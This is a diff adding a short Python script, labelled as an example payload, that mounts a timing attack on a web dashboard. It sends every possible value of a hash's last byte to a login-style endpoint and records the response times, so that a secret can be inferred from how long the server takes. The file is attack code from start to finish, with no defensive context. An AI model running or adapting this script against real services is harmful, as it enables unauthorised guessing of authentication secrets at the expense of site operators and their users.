@@ -1,0 +1,18 @@
+```python
+# Example payload for timing attack
+import time
+import requests
+
+def timing_attack(base_url, known_hash):
+    for i in range(256):  # Iterate over all possible byte values
+        test_hash = known_hash[:-1] + bytes([i])  # Modify the last byte
+        start_time = time.time()
+        response = requests.post(base_url, data={'user_hash': test_hash})
+        elapsed_time = time.time() - start_time
+        print(f'Testing hash: {test_hash.hex()} - Response time: {elapsed_time:.4f} seconds')
+
+# Example usage
+base_url = 'http://example.com/analytics_dashboard'
+known_hash = b'\x00\x00\x00\x00'  # Starting point for the hash
+timing_attack(base_url, known_hash)
+```
